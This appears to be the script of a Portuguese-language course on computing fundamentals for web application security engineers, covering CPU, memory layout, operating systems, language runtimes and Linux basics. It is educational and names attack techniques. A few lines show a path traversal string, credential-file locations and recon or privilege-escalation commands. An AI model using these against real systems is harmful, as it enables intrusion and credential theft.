🛡 Fundamentos para Web AppSec Engineer

A base técnica que todo profissional de segurança de aplicações precisa dominar

🕵️
Web AppSec

Antes de entender como atacar ou defender uma aplicação web, você precisa entender a máquina onde ela roda. Um computador é um sistema de processamento de informação composto por hardware e software que trabalham em camadas. Cada camada tem abstrações que simplificam o acesso à camada de baixo — e cada abstração pode conter vulnerabilidades. Neste vídeo, vamos desmistificar o que acontece desde o momento em que você liga o servidor até a instrução mais simples ser executada pela CPU. Este conhecimento é a fundação para entender ataques como buffer overflow, race condition, side-channel attacks e muito mais.

A CPU (Central Processing Unit) é o componente que executa instruções binárias — sequências de 0s e 1s que representam operações matemáticas e lógicas. Ela é composta por: a Unidade de Controle (lê e interpreta instruções), a Unidade Lógica e Aritmética — ALU (realiza cálculos), os registradores (memória ultrarápida dentro da CPU para dados temporários) e o cache (buffer entre a CPU e a RAM).

Para o Web AppSec Engineer, entender a CPU é essencial porque ela é o alvo final de qualquer exploit. Quando um atacante explora um buffer overflow em um servidor web em C, o objetivo é fazer a CPU executar código malicioso redirecionando o ponteiro de instrução (RIP/EIP). Ataques como ROP (Return-Oriented Programming) manipulam diretamente o fluxo de execução da CPU encadeando "gadgets" — pequenos trechos de código legítimo já presentes na memória.

Registradores importantes: RIP (instruction pointer — onde a CPU está executando), RSP (stack pointer — topo da pilha), RBP (base pointer — base do frame atual), RAX/RBX/RCX/RDX (propósito geral). Em um exploit de stack overflow, o objetivo é sobrescrever o RIP salvo na stack para apontar para código do atacante.

A RAM (Random Access Memory) é uma memória de acesso aleatório extremamente rápida onde todo programa em execução reside. Ela é volátil: quando o computador desliga, todo conteúdo é perdido. Fisicamente, é composta por células de capacitores que armazenam carga elétrica representando bits.

Uma RAM DDR5 moderna opera a cerca de 4800 MT/s (megatransferências por segundo), enquanto a latência de acesso fica na faixa de 10–70 ns. Compare isso com o cache L1 da CPU (<1 ns) e com um SSD NVMe (~50 µs). Essa diferença de velocidade é a razão pela qual o cache existe — e também a razão pela qual ataques de cache timing (como Spectre) funcionam: o atacante mede o tempo de acesso à memória para inferir dados secretos.

Por que isso importa para AppSec: aplicações web em Node.js, PHP, Python e Java todas têm sua memória mapeada na RAM. Vulnerabilidades de use-after-free ocorrem quando um programa acessa RAM que já foi liberada. Memory leaks (vazamentos de memória) em aplicações web podem levar a DoS por esgotamento de RAM. A leitura de memória fora dos limites (out-of-bounds read) pode expor dados sigilosos de outros usuários num servidor compartilhado.

Ao contrário da RAM, o armazenamento persistente (HDD ou SSD) mantém dados mesmo sem energia. HDDs (Hard Disk Drives) usam pratos magnéticos giratórios e uma cabeça de leitura/escrita mecânica — latência na faixa de 5–10 ms. SSDs usam chips NAND flash, sem partes mecânicas — latência de ~0,05–0,5 ms para NVMe PCIe.

Para o contexto de segurança web, o armazenamento é onde ficam: arquivos de configuração (como .env, config.php com credenciais), bancos de dados SQLite, logs de acesso, chaves privadas TLS e muito mais. Ataques de Path Traversal (como ../../../../etc/passwd) exploram a falta de validação ao acessar o sistema de arquivos. Local File Inclusion (LFI) permite que um atacante leia arquivos arbitrários do disco via uma aplicação web vulnerável.

Ponto crítico: backups mal configurados (arquivos .sql, .tar.gz) deixados em diretórios públicos do servidor web são uma das formas mais comuns de exposição de dados sensíveis — descobertos trivialmente com scanners de conteúdo como dirbuster ou gobuster.

O barramento (bus) é o conjunto de trilhas condutoras que conectam CPU, RAM, placa de rede, GPU e periféricos. Existem três tipos: barramento de dados (transfere os dados em si), barramento de endereço (indica onde na memória ler/escrever) e barramento de controle (sinaliza a operação: leitura ou escrita).

A interface PCIe (Peripheral Component Interconnect Express) é o barramento moderno de alta velocidade que conecta GPUs, SSDs NVMe e placas de rede. Uma placa de rede 10GbE conectada via PCIe pode transferir dados direto para a RAM sem passar pela CPU (técnica chamada DMA — Direct Memory Access).

Relevância para AppSec: ataques de DMA attack exploram dispositivos externos com acesso direto à memória para ler credenciais ou chaves criptográficas. Em ambientes de nuvem, o isolamento de DMA entre VMs é crítico para evitar que um tenant leia a memória de outro — um vetor de ataque em hypervisors vulneráveis.

Todo programa, seja um servidor web Nginx ou um malware, executa o mesmo ciclo fundamental repetidamente na CPU:

  • 1. Fetch (Busca): a CPU lê a instrução no endereço apontado pelo registrador RIP (Instruction Pointer) e incrementa RIP.
  • 2. Decode (Decodificação): a unidade de controle interpreta os bytes da instrução (opcode + operandos).
  • 3. Execute (Execução): a ALU realiza a operação, ou a CPU acessa memória, ou modifica registradores.
  • 4. Write-back: o resultado é escrito de volta em um registrador ou na memória.

Por que isso é fundamental para segurança: toda vulnerabilidade de execução de código (RCE — Remote Code Execution) busca, no fundo, inserir bytes maliciosos na memória e redirecionar o RIP para eles. Proteções como DEP/NX (Data Execution Prevention) marcam regiões de memória como não-executáveis para impedir isso. ASLR (Address Space Layout Randomization) aleatoriza os endereços de memória para dificultar que o atacante saiba para onde redirecionar o RIP. Entender o ciclo de execução é o pré-requisito para entender como essas proteções funcionam — e como são contornadas.

Quando você liga um servidor, o processo de boot define quem controla a máquina. A sequência é: UEFI/BIOS → Bootloader (GRUB) → Kernel → Init (systemd) → serviços e aplicações.

O Secure Boot (UEFI) verifica assinaturas criptográficas de cada componente antes de carregá-lo, criando uma cadeia de confiança. Se um atacante compromete o bootloader (bootkits), ele obtém persistência profundíssima — o malware roda antes do próprio sistema operacional, tornando-se praticamente invisível.

Para Web AppSec: em ambientes de nuvem e containers, o boot é abstraído. Mas conhecer a cadeia de confiança é essencial para entender supply chain attacks (ataques à cadeia de suprimentos de software), que comprometem componentes cedo no pipeline de build/deploy — muito antes do código chegar ao servidor de produção.

Quando você faz deploy de uma aplicação web, o sistema operacional cria um processo — um espaço de memória isolado onde seu código vive. Entender como esse espaço é organizado é absolutamente crítico para qualquer profissional de segurança. A maioria das vulnerabilidades críticas de aplicações — buffer overflow, heap spray, use-after-free, format string — explora diretamente a forma como a memória é organizada e gerenciada. Neste vídeo, vamos "abrir o capô" de um processo em execução e entender cada região de memória, como a stack e o heap funcionam em detalhes, e por que linguagens diferentes têm perfis de vulnerabilidade completamente diferentes.

Todo processo Linux tem um espaço de endereçamento virtual dividido em regiões distintas (visível com cat /proc/PID/maps):

  • .text (código): instruções compiladas do programa. Normalmente somente-leitura e executável (NX bit). Um atacante que consegue escrever aqui pode injetar shellcode.
  • .data / .bss: variáveis globais e estáticas inicializadas e não-inicializadas.
  • Heap: cresce "para cima" a partir de um endereço base. Gerenciado pelo alocador (malloc/free). Fonte de vulnerabilidades de heap.
  • Memory-mapped files: bibliotecas compartilhadas (.so/.dll) mapeadas aqui — inclui libc, OpenSSL, etc.
  • Stack: cresce "para baixo" desde o topo do espaço de endereços. Gerencia chamadas de funções.

Para AppSec: o comando cat /proc/PID/maps num servidor comprometido revela toda a estrutura de memória de um processo — incluindo onde as bibliotecas estão carregadas. Isso é exatamente o que um atacante usa para calcular endereços em exploits que contornam ASLR via info leak.

A stack é uma estrutura de dados LIFO (Last In, First Out) usada para gerenciar o fluxo de execução de funções. Cada vez que uma função é chamada, um stack frame é criado no topo da pilha contendo:

  • Os argumentos passados para a função
  • O endereço de retorno (para onde a CPU vai voltar depois que a função terminar)
  • O saved RBP (ponteiro de base do frame anterior)
  • As variáveis locais da função

O Stack Buffer Overflow é o exploit clássico: se uma função copia dados para um buffer local sem verificar o tamanho, um atacante pode enviar dados além do limite do buffer, sobrescrevendo o endereço de retorno. Quando a função termina, a CPU pula para o endereço do atacante em vez de voltar ao código legítimo.

Proteções modernas: Stack Canaries colocam um valor aleatório entre as variáveis locais e o endereço de retorno — se for sobrescrito, o programa aborta. ASLR randomiza o endereço base da stack. SafeStack (Clang/LLVM) separa stacks seguras de inseguras. Para web: funções em C como strcpy(), gets(), sprintf() sem limites são a raiz do problema — por isso linguagens modernas como Rust são memory-safe por padrão.

O heap é a região de memória para alocação dinâmica — quando você não sabe em compile-time quanto espaço vai precisar. Em C, malloc(size) pede ao sistema size bytes no heap; free(ptr) devolve. O gerenciador de heap (como ptmalloc no glibc) mantém listas de blocos livres e ocupados com metadados nos próprios headers dos blocos.

Vulnerabilidades de heap são algumas das mais exploradas no mundo real:

  • Use-After-Free (UAF): usar um ponteiro após liberar a memória. A memória pode ter sido realocada para outro objeto — um atacante pode controlar o conteúdo novo para forçar comportamento malicioso.
  • Heap Buffer Overflow: escrever além dos limites de um bloco, corrompendo os metadados do bloco adjacente.
  • Double-Free: liberar o mesmo ponteiro duas vezes, corrompendo as estruturas internas do heap.
  • Heap Spray: inundar o heap com shellcode para aumentar a probabilidade de um ponteiro apontar para código do atacante.

Em aplicações web modernas (JavaScript/Node.js, PHP, Java), o garbage collector elimina UAF e double-free — mas introduz novos vetores como prototype pollution (JavaScript) e deserialization attacks que manipulam objetos no heap.

Cada processo acredita que tem acesso exclusivo a um espaço de endereçamento enorme (2⁶⁴ bytes no x86-64). Isso é uma ilusão criada pelo SO e pelo hardware: a MMU (Memory Management Unit) traduz endereços virtuais para endereços físicos usando uma estrutura chamada Page Table.

A memória é dividida em páginas (normalmente 4 KB). Cada página tem atributos: leitura, escrita, execução (o NX bit — No-Execute). Se um processo tenta executar código numa página marcada como não-executável (heap, stack com NX), a CPU lança uma exceção — impedindo shellcode injetado direto na memória.

Meltdown e Spectre (2018) quebraram o isolamento entre processos e entre espaço de usuário/kernel explorando execução especulativa da CPU — permitindo leitura de memória fora dos limites através de um canal lateral de timing do cache. Servidores web em nuvem que rodam código de múltiplos tenants na mesma CPU física foram os mais afetados.

Décadas de exploits de memória levaram ao desenvolvimento de mitigações em camadas. Entender cada uma é essencial para o Web AppSec Engineer — tanto para saber quando uma aplicação está protegida quanto para entender os bypasses:

  • DEP/NX (Data Execution Prevention): marca heap e stack como não-executáveis. Bypass: ROP chains executam código legítimo já existente.
  • ASLR (Address Space Layout Randomization): randomiza endereços de base. Bypass: info leaks revelam endereços reais; força bruta em sistemas 32-bit.
  • PIE (Position Independent Executable): o próprio binário é carregado em endereço aleatório (requer ASLR + PIE juntos para máxima eficácia).
  • Stack Canary: valor aleatório verificado antes de cada retorno de função. Bypass: info leak do canary ou sobrescrita sem passar pelo canary.
  • RELRO (Relocation Read-Only): torna a GOT (Global Offset Table) somente-leitura após o link, impedindo overwrites de ponteiros de funções.
  • SafeStack / Shadow Stack (CET): mantém uma cópia protegida dos endereços de retorno. Intel CET (Control Enforcement Technology) implementa isso em hardware.

Linguagens com garbage collector (Java, Python, Go, JavaScript, C#) eliminam automaticamente as classes mais tradicionais de vulnerabilidades de memória (UAF, double-free) porque o GC decide quando liberar objetos — o programador não gerencia memória diretamente.

Rust vai além: sem GC, usa um sistema de ownership e borrow checker que garante memory safety em compile-time. É a razão pela qual Rust é cada vez mais adotado em componentes críticos de segurança (kernels, navegadores, firewalls).

Mas atenção: GC não elimina todas as vulnerabilidades. Em Python/PHP/Java ainda existe: SQL Injection (não é problema de memória, é de validação), deserialization (permite execução arbitrária ao reconstruir objetos), prototype pollution (JavaScript), e memory leaks por referências esquecidas que enganam o GC. A classe de vulnerabilidade muda — não desaparece.

A CPU moderna é uma das engenharias mais complexas da humanidade. Para extrair máximo desempenho, processadores modernos implementam dezenas de técnicas avançadas — pipeline, execução fora de ordem, execução especulativa, branch prediction, cache hierárquico. O problema é que cada uma dessas otimizações pode criar vulnerabilidades de segurança. As famosas falhas Spectre e Meltdown (2018) exploram exatamente essas otimizações. Para o Web AppSec Engineer, entender o processador permite compreender ataques de timing, side-channels e por que certas operações criptográficas precisam ser implementadas de forma tão cuidadosa.

A ISA (Instruction Set Architecture) é o contrato entre software e hardware: define o conjunto de instruções que a CPU entende, os registradores disponíveis, os modos de endereçamento e o comportamento de cada instrução. É a linguagem que o compilador usa para traduzir seu código de alto nível.

As duas ISAs dominantes hoje são:

  • x86-64 (AMD64): CISC (Complex Instruction Set Computer). Instruções de tamanho variável, altamente complexa. Domina servidores (Intel Xeon, AMD EPYC) e desktops. A maioria dos exploits de aplicações web em produção roda em x86-64.
  • ARM64 (AArch64): RISC (Reduced Instruction Set Computer). Instruções de tamanho fixo, mais simples. Domina mobile (Android/iOS) e ganha tração em servidores (AWS Graviton, Apple Silicon).

Para AppSec: shellcode e exploits são específicos de arquitetura. Um exploit x86-64 não roda em ARM. Entender a ISA é necessário para ler disassembly de binários suspeitos, analisar malware e desenvolver exploits em CTFs de binary exploitation.

O pipeline divide a execução de uma instrução em múltiplos estágios que operam em paralelo — como uma linha de montagem. Um pipeline de 5 estágios clássico: Fetch → Decode → Execute → Memory → Write-back. Enquanto a instrução #1 está em Execute, a instrução #2 já está em Decode e a #3 em Fetch.

Execução fora de ordem (Out-of-Order Execution / OoOE): CPUs modernas (Intel Core, AMD Zen) analisam um "janela" de instruções à frente e reordenam sua execução para maximizar uso das unidades funcionais, respeitando as dependências de dados. A ordem é preservada apenas na visão do programador — internamente é caos organizado.

Branch Prediction: a CPU tenta adivinhar o resultado de desvios condicionais (if) e executa o caminho mais provável especulativamente. Se errar, descarta os resultados (flush do pipeline) — mas o cache já foi modificado. Isso é a base do Spectre Variant 1: um atacante pode fazer a CPU executar código especulativamente que acessa memória proibida, e inferir o resultado pelo timing do cache — mesmo que a execução seja "descartada".

A hierarquia de cache existe para compensar a enorme diferença de velocidade entre CPU e RAM:

  • L1 (por core): ~32-64 KB, latência ~1-4 ciclos (<1 ns). Dados e instruções.
  • L2 (por core): ~256 KB–1 MB, latência ~10-20 ciclos (~5 ns).
  • L3 (compartilhado): ~4–64 MB, latência ~40-80 ciclos (~20-40 ns).
  • RAM: latência ~100-200 ciclos (~50-100 ns).

Ataques de cache timing exploram essa diferença medindo o tempo de acesso à memória. Se um acesso a um endereço é rápido (~5 ns), o dado estava no cache. Se é lento (~100 ns), não estava. Isso permite inferir padrões de acesso de outros processos.

Flush+Reload, Prime+Probe, Evict+Time são técnicas de side-channel baseadas em cache usadas para extrair chaves AES, RSA e outros segredos criptográficos. Para implementações seguras de criptografia, o tempo de execução não deve depender dos dados secretos — isso é chamado de constant-time programming e é exigido em bibliotecas como OpenSSL.

Reveladas em janeiro de 2018 por pesquisadores do Google Project Zero, Spectre e Meltdown são vulnerabilidades fundamentais no design de CPUs modernas — afetando praticamente toda CPU fabricada desde 1995.

Meltdown (CVE-2017-5754): explorava a execução fora de ordem para ler memória do kernel a partir do espaço de usuário. Um processo sem privilégios podia ler qualquer endereço físico de memória, incluindo memória de outros processos e do kernel. Correção: KPTI (Kernel Page-Table Isolation) — separa completamente as page tables de kernel e usuário, com custo de performance de até 30%.

Spectre (CVE-2017-5753/5715): mais difícil de corrigir. Explora branch prediction para vazar informações entre processos. Afeta Chrome (via JavaScript), VMs em nuvem e praticamente qualquer sistema. Mitigações como Retpoline, IBRS, microcode updates reduzem mas não eliminam completamente o risco.

Impacto para Web AppSec: um script JavaScript malicioso numa página web pode explorar Spectre para ler memória do navegador — incluindo cookies, tokens de autenticação e senhas. Isso levou à redução da resolução de performance.now() e desativação de SharedArrayBuffer em navegadores.

CPUs modernas têm múltiplos núcleos físicos, cada um capaz de executar threads independentemente. Hyper-Threading (Intel) / SMT (AMD) duplica núcleos lógicos por core físico, compartilhando recursos de execução.

Race Condition (Condição de Corrida) é uma vulnerabilidade que ocorre quando dois ou mais threads acessam recursos compartilhados sem sincronização adequada, e o resultado depende da ordem de execução. Em aplicações web: uma race condition no processo de pagamento pode permitir que um usuário compre um item pagando apenas uma vez enquanto o servidor credita múltiplas vezes. Ou em sistemas de autenticação: múltiplas requisições simultâneas para trocar a senha podem resultar em estado inconsistente.

TOCTOU (Time-of-Check Time-of-Use): uma classe específica de race condition onde um recurso é verificado numa condição e usado em outra, com uma janela de tempo entre os dois onde um atacante pode modificar o recurso. Exemplo clássico em segurança: checar se um arquivo existe antes de abrir — entre o check e o open, o atacante substitui o arquivo por um symlink para /etc/passwd.

O sistema operacional é o intermediário entre o hardware e as aplicações — e é também um dos alvos mais críticos de ataques. Todo servidor web roda sobre um SO, e entender como ele gerencia processos, memória, arquivos e rede é essencial para qualquer profissional de segurança. Neste vídeo, vamos explorar como o kernel funciona, o que são system calls e por que elas importam para segurança, como o SO isola processos, como ele gerencia permissões, e como vulnerabilidades no kernel podem comprometer completamente um sistema — mesmo quando a aplicação web em cima está "segura".

O kernel Linux opera em dois níveis de privilégio distintos definidos pelo hardware (rings do x86):

  • Ring 0 — Kernel Space: código com acesso irrestrito ao hardware. O kernel, drivers e módulos rodam aqui. Um bug aqui compromete todo o sistema.
  • Ring 3 — User Space: onde suas aplicações rodam. Acesso ao hardware é mediado pelo kernel via system calls. Um crash aqui afeta apenas aquele processo.

Vulnerabilidades de kernel (privilege escalation) permitem que um processo em Ring 3 execute código em Ring 0, obtendo controle total do sistema. Exemplos famosos: Dirty COW (CVE-2016-5195) — race condition no kernel Linux que permitia escrita em arquivos somente-leitura; DirtyPipe (CVE-2022-0847) — similar, explorava pipes do Linux para sobrescrever arquivos arbitrários, incluindo binários SUID como /usr/bin/passwd.

Para Web AppSec: mesmo que sua aplicação web seja perfeita, um kernel vulnerável no servidor pode ser explorado via Local Privilege Escalation depois que um atacante obtém uma shell (ex: via RCE na aplicação).

Toda vez que uma aplicação precisa fazer algo que envolve o hardware ou recursos compartilhados, ela faz uma system call — uma chamada controlada para o kernel. No Linux, existem ~400 syscalls. As mais relevantes para segurança:

  • open() / read() / write(): operações de arquivo — alvos de path traversal e LFI.
  • execve(): executa um novo programa — o objetivo de qualquer RCE é chegar aqui.
  • socket() / connect() / bind(): rede — um webshell usa isso para criar conexões reversas.
  • mmap() / mprotect(): manipulação de memória — usados em exploits para marcar regiões como executáveis.
  • fork() / clone(): criação de processos — base de command injection.
  • ptrace(): anexar a outro processo — usado em depuradores, também por rootkits para ocultar comportamento.

Seccomp (Secure Computing Mode) é uma proteção do Linux que limita quais syscalls um processo pode fazer. Containers Docker e sandboxes de navegadores usam seccomp para reduzir a superfície de ataque — um processo comprometido não consegue fazer execve() se o seccomp proibir.

O modelo de permissões Unix clássico é DAC (Discretionary Access Control): cada arquivo tem um dono (user), um grupo, e permissões para três classes: dono (u), grupo (g), outros (o) — com bits de leitura (r), escrita (w) e execução (x).

SUID (Set User ID): quando ativo num executável, o programa roda com as permissões do dono do arquivo, não do usuário que executou. /usr/bin/passwd tem SUID de root para poder modificar /etc/shadow. Um binário SUID mal implementado é um vetor clássico de privilege escalation — explorar uma vulnerabilidade nele dá shell de root.

Linux Capabilities: subdividem os privilégios de root em ~40 capacidades granulares. Em vez de dar root completo, você pode dar apenas CAP_NET_BIND_SERVICE (para fazer bind em portas <1024) ou CAP_SYS_PTRACE. Em containers: verificar capabilities excessivas é uma das primeiras coisas num pentest de container — CAP_SYS_ADMIN é equivalente a root e permite fuga do container.

sudo e /etc/sudoers: configurações permissivas de sudo são um alvo constante. sudo -l é um dos primeiros comandos em escalada de privilégios pós-exploração.

O SO isola processos uns dos outros usando espaços de endereçamento virtual separados. Um processo não pode acessar diretamente a memória de outro — a MMU garante isso. Mas existem mecanismos legítimos de comunicação entre processos (IPC): pipes, sockets Unix, shared memory, signals.

Containers (Docker, Podman) não são VMs — eles compartilham o mesmo kernel do host. O isolamento é feito por features do kernel Linux:

  • Namespaces: isolam visibilidade de PID, rede, sistema de arquivos, usuários, etc.
  • cgroups: limitam recursos (CPU, memória, I/O) por grupo de processos.
  • seccomp: filtro de syscalls.
  • AppArmor/SELinux: políticas de acesso mandatório (MAC).

Container escape: uma vulnerabilidade no kernel, driver ou configuração incorreta de namespace/capabilities pode permitir que um processo dentro de um container comprometa o host. Vetores comuns: montagem do socket Docker (/var/run/docker.sock), capabilities excessivas (--privileged), montagem do sistema de arquivos do host.

O sistema de arquivos é muito mais do que apenas organizar arquivos em diretórios. Para segurança, os aspectos críticos são:

  • Symlinks (links simbólicos): apontam para outro caminho. Explorados em ataques TOCTOU e path traversal. Um tempfile com symlink pode redirecionar escritas para arquivos do sistema.
  • Hardlinks: múltiplas entradas de diretório para o mesmo inode. Mesmo arquivo, múltiplos caminhos — pode contornar algumas ACLs.
  • /proc (procfs): sistema de arquivos virtual que expõe informações dos processos em tempo real. /proc/self/environ pode vazar variáveis de ambiente (com credenciais). /proc/self/fd/ — file descriptors abertos. Explorado via LFI para ler arquivos de qualquer processo.
  • Sticky bit em diretórios (como /tmp): apenas o dono pode deletar seus próprios arquivos, mesmo que o diretório seja world-writable.
  • Extended attributes e ACLs: controle de acesso mais granular que o modelo Unix clássico.

Auditoria de sistema de arquivos: inotifywait e o subsistema de auditoria do Linux (auditctl) permitem monitorar acessos a arquivos sensíveis em tempo real — fundamentais para detecção de intrusão.

Para um Web AppSec Engineer, entender como o SO lida com conexões de rede é fundamental. O kernel Linux implementa a pilha TCP/IP completa, desde o driver de NIC até o socket da aplicação.

Sockets e portas: uma aplicação abre um socket TCP/UDP e faz bind em uma porta. Portas <1024 requerem root ou CAP_NET_BIND_SERVICE. netstat -tulpn ou ss -tulpn lista todos os sockets abertos — primeiro passo numa auditoria de servidor.

Firewall (iptables/nftables): o kernel filtra pacotes usando regras. iptables -L -n -v lista as regras ativas. Um servidor web mal configurado pode ter portas internas (banco de dados, Redis, Memcached) expostas sem firewall.

TIME_WAIT e SYN flood: ataques DoS exploram o estado de conexão TCP. SYN cookies e limites de backlog são mitigações no kernel. Para AppSec: rate limiting precisa ser implementado em múltiplas camadas — não só na aplicação, mas também no kernel e no loadbalancer.

A forma como uma linguagem transforma código-fonte em instruções executáveis define profundamente seu perfil de segurança. Linguagens compiladas e interpretadas têm classes de vulnerabilidades completamente diferentes. Um Web AppSec Engineer precisa entender o modelo de execução de cada linguagem para saber onde procurar vulnerabilidades: em aplicações Python/Ruby/PHP você pensa em injeção e deserialização; em aplicações C/C++ você pensa em corrupção de memória. Neste vídeo, vamos traçar o caminho do código-fonte até a execução em cada paradigma — e conectar cada etapa às vulnerabilidades que ela pode introduzir.

O processo de compilação transforma código-fonte em código de máquina nativo através de várias fases:

  • Preprocessamento: expande macros e includes (#include, #define).
  • Análise léxica e sintática: transforma texto em AST (Abstract Syntax Tree).
  • Análise semântica: verifica tipos, escopos, declarações.
  • Geração de código intermediário: LLVM IR, GCC GIMPLE.
  • Otimização: inline de funções, eliminação de dead code, etc.
  • Geração de código de máquina: assembly específico da arquitetura.
  • Linking: resolve referências externas, une object files em executável.

Exemplos: C, C++, Rust, Go, C#, Swift. O resultado é um binário nativo (ELF no Linux, PE no Windows, Mach-O no macOS).

Para AppSec: binários compilados podem ser analisados com ferramentas de reverse engineering como Ghidra (NSA, open-source) e IDA Pro. O processo de engenharia reversa é central para análise de malware, firmware e aplicações sem código-fonte. Ferramentas como checksec verificam quais proteções (ASLR, PIE, NX, Canary, RELRO) estão habilitadas num binário.

Em linguagens interpretadas, um programa chamado interpretador lê o código-fonte (ou bytecode) e o executa diretamente, instrução a instrução. Não há executável nativo gerado com antecedência.

PHP: ainda domina mais de 75% dos servidores web. O motor Zend Engine interpreta PHP. Vulnerabilidades clássicas: SQL Injection, RFI/LFI, command injection via exec()/system(), deserialização insegura com unserialize(), type juggling (PHP compara "0e123" == "0e456" como iguais por causa de conversão automática de tipo para float).

Python: usado em backends modernos (Django, Flask, FastAPI). Vulnerabilidades: eval() e exec() com input de usuário (injeção de código), Server-Side Template Injection (SSTI) em Jinja2, pickle deserialization, command injection via os.system() ou subprocess sem sanitização.

Ruby: usado no Rails. Vulnerabilidades históricas de deserialização YAML (YAML.load vs YAML.safe_load), mass assignment (whitelist de params insuficiente).

Bash: scripts de shell são interpretados pelo bash. Shellshock (CVE-2014-6271) explorava como o bash processava variáveis de ambiente para executar código arbitrário — afetando CGI scripts em servidores Apache em todo o mundo.

O JIT (Just-In-Time) compiler monitora quais partes do código são executadas frequentemente ("hot paths") e as compila para código de máquina nativo em tempo real — combinando a flexibilidade da interpretação com a performance da compilação.

V8 (Chrome/Node.js) e SpiderMonkey (Firefox) implementam JIT para JavaScript. O pipeline típico: código JS → bytecode Ignition → código JIT Turbofan → código de máquina nativo.

JIT Spraying: técnica de exploit que força o JIT compiler a emitir shellcode como parte de constantes numéricas em expressões. O atacante escreve JS com constantes específicas que, quando compiladas pelo JIT, produzem bytes de shellcode na memória executável — contornando DEP/NX.

Para Web AppSec: JavaScript rodando no cliente é o vetor de XSS (Cross-Site Scripting) — a vulnerabilidade web mais prevalente (OWASP Top 10). No servidor, Node.js tem suas próprias particularidades: prototype pollution (modificar Object.prototype para afetar todo o código da aplicação), injeção em template engines (Pug, Handlebars), ReDoS (Regular Expression Denial of Service) — regex mal escritas que consomem CPU exponencialmente.

Java compila para bytecode (.class files) que roda na JVM (Java Virtual Machine) — uma máquina virtual que interpreta ou JIT-compila o bytecode. Isso dá portabilidade ("write once, run anywhere") mas adiciona uma camada de complexidade.

Serialização Java é o processo de converter um objeto em bytes para transmissão ou armazenamento. Deserialização insegura (OWASP Top 10 A08) ocorre quando dados serializados de fontes não-confiáveis são desserializados — o que pode acionar código arbitrário via "gadget chains": sequências de métodos legítimos que, encadeados durante a desserialização, executam Runtime.exec().

Apache Commons Collections RCE (2015, CVE-2015-4852) e a cadeia de exploits resultante afetou WebLogic, JBoss, Jenkins e dezenas de outros sistemas Java. A ferramenta ysoserial gera payloads de desserialização Java para pentests.

Python pickle: mesmo problema — pickle.loads() pode executar código arbitrário. Nunca desserialize pickle de fontes não-confiáveis. PHP unserialize(): idem, com suas próprias gadget chains (POP chains — Property-Oriented Programming).

A NSA, CISA, Microsoft e Google publicaram relatórios recomendando a transição para linguagens memory-safe. Estima-se que ~70% das vulnerabilidades críticas no Chrome e no Windows kernel sejam bugs de memória em C/C++.

Rust elimina em compile-time: buffer overflows, use-after-free, null pointer dereferences, data races — sem garbage collector, sem overhead de runtime. O sistema de ownership garante que cada dado tem exatamente um dono, e referências são sempre válidas. Usado em: Firefox (partes do motor), Linux kernel (módulos opcionais desde 6.1), Cloudflare (proxies), AWS (sistemas críticos).

Go tem GC, não é memory-safe no nível de Rust, mas elimina as classes mais perigosas de bugs de memória. Muito usado em ferramentas de segurança (Nuclei, subfinder, httpx, gobuster são escritos em Go).

Para o Web AppSec Engineer: saber que sua aplicação é escrita em Rust significa que classes inteiras de vulns de memória são eliminadas — você foca em lógica de negócio, injeção, controle de acesso. Em C/C++, todas as portas estão abertas.

Linux não é apenas o SO mais usado em servidores web — é também o ambiente de trabalho padrão de profissionais de segurança. Kali Linux, Parrot OS, BlackArch, as ferramentas de pentest mais poderosas (Burp Suite, nmap, metasploit, sqlmap, nuclei, ffuf) — tudo roda nativamente em Linux. Ubuntu é o ponto de partida perfeito: estável, amplamente documentado, com enorme base de pacotes, e idêntico ao ambiente de produção da maioria dos servidores que você vai avaliar. Neste vídeo, vamos do zero ao domínio operacional: terminal, hierarquia de arquivos, permissões, networking, gerenciamento de processos e as ferramentas essenciais para Web AppSec.

Linux é apenas o kernel — o núcleo do sistema. O que chamamos de "Linux" no dia a dia é na verdade GNU/Linux: o kernel Linux + ferramentas do projeto GNU (gcc, bash, coreutils, glibc) + um gerenciador de pacotes + interface gráfica (opcional).

Uma distribuição empacota tudo isso com configurações padrão, suporte e um ciclo de lançamentos. As mais relevantes para Web AppSec:

  • Ubuntu LTS (Long Term Support): base estável, suporte 5 anos. O que a maioria dos servidores web roda (Ubuntu 20.04, 22.04, 24.04). Excelente para aprender.
  • Kali Linux: baseado em Debian. Vem com centenas de ferramentas de pentest pré-instaladas. Padrão da indústria para testes de penetração. Pode ser usado como VM ou live USB.
  • Debian: a "mãe" de Ubuntu. Ultra-estável, mais comum em servidores antigos.
  • CentOS/RHEL/Rocky/AlmaLinux: padrão corporativo. SELinux ativo por default — sistema de controle de acesso mandatório (MAC) que vai além das permissões Unix.
  • Alpine Linux: minimalista (~5 MB). Base de containers Docker — menos pacotes = menor superfície de ataque.

O terminal é a principal interface de trabalho de um Web AppSec Engineer. Dominar o shell não é opcional — é pré-requisito. O Bash (Bourne Again Shell) é o shell padrão no Ubuntu.

Comandos essenciais por categoria:

  • Navegação: ls -la, cd, pwd, find / -name "*.conf", locate
  • Texto/busca: grep -r "password" /etc/, awk, sed, cut, sort, uniq, wc
  • Rede: curl, wget, nc (netcat), nmap, ss -tulpn, tcpdump, ping, dig, whois
  • Processos: ps aux, htop, kill, lsof -i :80, strace, ltrace
  • Permissões: chmod, chown, sudo, su, id, whoami
  • Arquivos: cat, less, head/tail, tar, zip, base64, xxd, strings
  • Redirecionamento: | (pipe), >, >>, 2>&1, &&, ||

Bash scripting permite automatizar tarefas de reconhecimento: iterar sobre uma lista de IPs, testar credenciais, processar output de ferramentas. Ex: for ip in $(cat ips.txt); do nmap -p 80,443 $ip; done.

O FHS (Filesystem Hierarchy Standard) define onde cada tipo de arquivo deve residir no Linux. Para o Web AppSec Engineer, saber onde olhar é metade do trabalho de uma investigação:

  • /etc/ — Configurações do sistema. /etc/passwd, /etc/shadow (hashes de senha), /etc/nginx/, /etc/apache2/, /etc/ssh/sshd_config, /etc/crontab.
  • /var/log/ — Logs: auth.log (tentativas de login), syslog, nginx/access.log, apache2/error.log.
  • /var/www/ — Root padrão de aplicações web (onde os arquivos PHP/HTML ficam).
  • /tmp/ e /var/tmp/ — Temporários. World-writable — alvos frequentes de escalada de privilégios via race conditions.
  • /proc/ — Filesystem virtual. /proc/PID/cmdline (linha de comando do processo), /proc/PID/environ (variáveis de ambiente — pode ter senhas!), /proc/net/tcp (conexões TCP).
  • /home/ — Diretórios de usuários. ~/.ssh/ (chaves SSH), ~/.bash_history (histórico de comandos — frequentemente com credenciais).
  • /root/ — Home do superusuário.
  • /bin/, /usr/bin/ — Binários. Binários SUID aqui são alvos de privilege escalation.
  • /lib/, /usr/lib/ — Bibliotecas compartilhadas (.so). Hijacking de bibliotecas via LD_PRELOAD.

